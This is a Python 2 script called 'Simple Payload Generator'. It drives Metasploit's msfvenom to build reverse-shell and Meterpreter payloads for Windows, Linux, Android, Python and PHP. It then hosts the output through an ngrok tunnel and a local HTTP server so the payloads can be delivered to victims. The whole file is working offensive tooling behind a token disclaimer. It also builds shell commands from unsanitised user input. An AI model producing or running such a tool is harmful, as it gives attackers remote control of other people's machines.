#!/usr/bin/python
#-*- coding: utf-8 -*-
################################################################################
#                                                                              #
#                                   SPG                                        #
#                          Simple Payload Generator                            #
#                             by: Assassin umz                                 #
#                                                                              #
# Follow me :                                                                  #
# •YouTube: https://youtube.com/c/pixiters                                     #
# •Discord: https://discord.gg/3nfQadt                                         #
# •Website: http://pixiters.ga                                                 #
# •GitHub: https://github.com/Assassinumz                                      #
#                                                                              #
#                                 LICENSE                                      #
# THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE  #
# THIS SOFTWARE AT YOUR OWN RISK. The use of this software Simple Payload      #
# Generator(SPG) is COMPLETE RESPONSIBILITY of the END-USER. Developers assume #
#  NO liability and are NOT responsible for any misuse or damage caused by     #
# this program.                                                                #
#                                                                              #
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY     #
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES   #
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; #
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND  #
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT   #
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF     #
# THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE             #
#                                                                              #
################################################################################

import os, platform, wget
from SimpleHTTPServer import test
from sys import exit
from time import sleep

red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def head():
    os.system('clear')
    print'''{0}
  █████████  ████████    ████████
  ███        ███    ██  ███
  ███        ███    ██  ███
  █████████  ████████   ███    ████
        ███  ███        ███      ██
        ███  ███        ███      ██
  █████████  ███         █████████
|====(Simple Payload Generator)====|{3}

{2}Follow me :{3}
{1}•{3} GitHub : {4}https://github.com/Assassinumz{3}
{1}•{3} YouTube: {4}https://youtube.com/c/pixiters{3}
{1}•{3} Discord: {4}https://discord.gg/3nfQadt{3}
{1}•{3} Website: {4}http://pixiters.ga{3}
'''.format(orange, green, bold, end, cyan)

def disclaimer():
    print('This tool was developed for learning purposes only and the use is complete responsibility of the end-user. Do you accept to cause no harm to any machine and use this tool for educational purposes only ? {0}(yes/no){1}').format(bold, end)
    if raw_input("\n{0}{1}SPG:~#{2} ".format(green, bold, end)) == 'yes':
        print('{0}Proceeding...{1}').format(green, end)
        sleep(1)
    else:
        print('{0}You must accept the terms and conditions to use this tool.{1}').format(red, end)
        exit(0)

def finish():
    head()
    print('{0}Until next time...{1}').format(green, end)
    exit(0)

def present():
    if os.path.isfile('/usr/bin/msfvenom') == False:
        print('{0}Failed to locate msfvenom. Make sure Metasploit-Framework is installed correctly and try again.{1}').format(red, end)
        exit(0)
    if os.path.isdir('output') == False:
        head()
        print('{0}Creating output directory{1}').format(green, end)
        os.makedirs('output')
        sleep(1)
    if os.path.isfile('ngrok') == False:
        head()
        print("{0}Downloading Ngrok...{1}").format(green, end)
        if platform.architecture == "32bit":
            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz')
            os.system('tar -xf ngrok-stable-linux-386.tgz')
            os.system('rm ngrok-stable-linux-386.tgz')
        else:
            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz')
            os.system('tar -xf ngrok-stable-linux-amd64.tgz')
            os.system('rm ngrok-stable-linux-amd64.tgz')

def server():
    os.system('cd output/ && python -m SimpleHTTPServer 80')

def ngrok():
    head()
    try:
        os.system('./ngrok http 80 > /dev/null &')
        sleep(5)
        os.system('curl -s -N http://127.0.0.1:4040/status | grep "http://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
        sleep(5)
        url = open('ngrok.url', 'r')
        print('\nNgrok Url:{0} ' + url.read() + '{1}').format(cyan, end)
        os.system('cd output/ && python -m SimpleHTTPServer 80 &')
        sleep(5)
        raw_input('Hit {0}(Return){1} to stop the server and return back to Main Menu'.format(bold, end))
        os.system('pkill -f "python -m SimpleHTTPServer 80"')
        os.system('pkill -f ngrok')
        url.close()
        choosepayload()
    except KeyboardInterrupt:
        os.system('pkill -f "python -m SimpleHTTPServer 80"')
        os.system('pkill -f ngrok')
        finish()

def main(platform, type):
    lhost = raw_input("\nEnter your LHOST\n{0}{1}SPG:~/LHOST#{2} ".format(green, bold, end))
    lport = raw_input("\nEnter your LPORT\n{0}{1}SPG:~/LPORT#{2} ".format(green, bold, end))
    output = raw_input("\nEnter the name of output file\n{0}{1}SPG:~/output#{2} ".format(green, bold, end))
    #Windows
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        extension= '.exe'
    #linux
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    #Android
    elif platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.apk'
    #Python
    elif platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.py'
    #PHP
    elif platform == 'PHP' and type == '1':
        payload= 'php/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.php'
    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
    sleep(3)
    if os.path.isfile('output/'+output+extension) == False:
        head()
        raw_input('{2}Failed to create payload, please try again.{1} {0}(Hit Enter to continue){1}'.format(bold, end, red))
        choosepayload()
    else:
        def server_start():
            head()
            http_server = raw_input('Your payload has been sucessfully generated in the output directory. Do you want to start Ngrok server now ? {1}(y/n){2}\n{0}{1}SPG:~#{2} '.format(green, bold, end))
            if http_server == 'y' or http_server == 'Y':
                ngrok()
            elif http_server == 'n' or http_server == 'N':
                choosepayload()
            else:
                raw_input('Please Choose a Valid option {0}(Hit Return to continue){1}'.format(bold, end))
                server_start()
        server_start()

def choosepayload():
    head()
    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}6{0}]{1} Start Ngrok Server\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}SPG:~#{1} '.format(green, end, bold))
    if select == '1':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Windows#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Windows', type)
    elif select == '2':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Linux#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Linux', type)
    elif select == '3':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Android#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Android', type)
    elif select == '4':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Python#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Python', type)
    elif select == '5':
        head()
        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/PHP#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('PHP', type)
    elif select == '6':
        ngrok()
    elif select == '0':
        finish()
    else:
        head()
        print('{0}Please choose a valid option.{1}').format(red, end)
        sleep(2)
        choosepayload()

if __name__ == "__main__":
    try:
        head()
        disclaimer()
        present()
        choosepayload()
    except KeyboardInterrupt:
        finish()
